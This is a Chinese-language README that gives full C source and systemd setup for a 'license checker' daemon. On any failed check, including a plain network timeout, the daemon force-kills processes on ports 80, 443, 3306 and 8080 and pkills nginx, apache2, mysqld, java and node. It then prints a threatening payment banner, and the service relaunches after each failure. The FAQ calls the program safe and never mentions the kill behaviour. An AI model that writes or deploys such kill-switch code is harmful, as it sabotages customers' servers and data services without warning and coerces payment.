## 📌 项目介绍

这是一个基于 `libcurl + C` 编写的轻量授权校验守护进程。

**运行机制如下：**

- 每次运行会请求远程授权服务器验证 License；
- 如果验证失败，将自动：
  - 杀掉常见服务端口（3306, 80, 443, 8080）；
  - 杀掉常见进程（nginx, apache2, mysqld...）；
  - 输出文化警告，震慑无赖；
  - 写入锁文件，主程序可据此终止运行。

---

## ⚙️ 环境要求

- Linux 系统（推荐 Ubuntu / Debian / CentOS）
- 已安装 `gcc`
- 已安装 `libcurl-dev` 开发库（`sudo apt install libcurl4-openssl-dev`）

---

## 🔧 编译步骤

1. 将以下代码保存为 `license_checker.c`：

<details>
<summary>🔍 点击查看完整源代码（含中文注释）</summary>

```c
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// 🚩 替换为你的授权码
#define LICENSE_KEY "abc123"

// 🚩 替换为你的服务器验证地址
#define LICENSE_SERVER_URL "https://your-license-server.com/verify?key=" LICENSE_KEY

#define LOCK_FILE "/tmp/license_invalid.lock"

int ports_to_kill[] = {3306, 8080, 80, 443};
const char *services_to_kill[] = {"nginx", "apache2", "httpd", "mysqld", "java", "node"};

// 校验授权码
int check_license() {
    CURL *curl;
    CURLcode res;
    long response_code = 0;

    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "💥 libcurl 初始化失败！\n");
        return 0;
    }

    curl_easy_setopt(curl, CURLOPT_URL, LICENSE_SERVER_URL);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);

    res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    } else {
        fprintf(stderr, "🚨 curl 错误: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
    return response_code == 200;
}

void write_lock_file() {
    FILE *fp = fopen(LOCK_FILE, "w");
    if (fp) {
        fprintf(fp, "INVALID_LICENSE\n");
        fclose(fp);
    }
}

void kill_ports() {
    for (int i = 0; i < sizeof(ports_to_kill) / sizeof(int); i++) {
        int port = ports_to_kill[i];
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "lsof -ti :%d | xargs -r kill -9", port);
        system(cmd);
    }
}

void kill_services() {
    for (int i = 0; i < sizeof(services_to_kill) / sizeof(char *); i++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "pkill -f %s", services_to_kill[i]);
        system(cmd);
    }
}

int main() {
    if (!check_license()) {
        printf(
            "\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃ 【授权提示】                        ┃\n"
            "┃                                    ┃\n"
            "┃  吾等劳苦功高，开拓天地间，       ┃\n"
            "┃  恳请无赖君子，勿要辜负此心。     ┃\n"
            "┃  欲享我等造物，唯有敬意相付。     ┃\n"
            "┃                                    ┃\n"
            "┃  无赖必须付款，勿以恶小而为之。     ┃\n"
            "┃  付费乃大道，方可长久安然。         ┃\n"
            "┃                                    ┃\n"
            "┃  —— 灵儿温馨提示，拒付者休怪断网断服 ——  ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        );
        write_lock_file();
        kill_ports();
        kill_services();
        return 1;
    }

    printf("✅ 授权验证成功，程序正常运行。\n");
    return 0;
}
```

````

</details>

2. 编译程序：

```bash
gcc license_checker.c -o /usr/local/bin/license_checker -lcurl
chmod +x /usr/local/bin/license_checker
```

---

## 🔁 设置开机自启（Systemd）

创建服务文件：

```bash
sudo tee /etc/systemd/system/license-checker.service << EOF
[Unit]
Description=License Verification Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/license_checker
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
```

启用服务：

```bash
sudo systemctl daemon-reload
sudo systemctl enable license-checker.service
sudo systemctl start license-checker.service
```

查看日志：

```bash
journalctl -u license-checker -f
```

---

## 🎯 客户提示语

> 灵儿提示：此软件已启用授权守护机制，如您尚未获得授权，请联系售后支持进行付费激活。未经许可擅自使用，将可能导致系统服务中止或数据连接中断。

---

## 🚫 警告终端输出示例

```text
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ 【授权提示】                        ┃
┃                                    ┃
┃  吾等劳苦功高，开拓天地间，       ┃
┃  恳请无赖君子，勿要辜负此心。     ┃
┃  欲享我等造物，唯有敬意相付。     ┃
┃                                    ┃
┃  无赖必须付款，勿以恶小而为之。     ┃
┃  付费乃大道，方可长久安然。         ┃
┃                                    ┃
┃  —— 灵儿温馨提示，拒付者休怪断网断服 ——  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
```

---

## 💬 FAQ

- **Q:** 这个程序安全吗？

  - **A:** 它不联网除了验证授权，没有任何数据上报；你可以直接审查源码。

- **Q:** 能否编译为静态二进制？

  - **A:** 可以，使用 `gcc -static` 搭配静态 `libcurl` 即可。

- **Q:** 是否支持国产操作系统？

  - **A:** 支持统信、银河麒麟等 Linux 兼容系统。

---

## 💌 联系与支持

请联系灵儿 @你们的官方商务微信/邮箱，获取更多商用支持与集成服务。

---

```
````
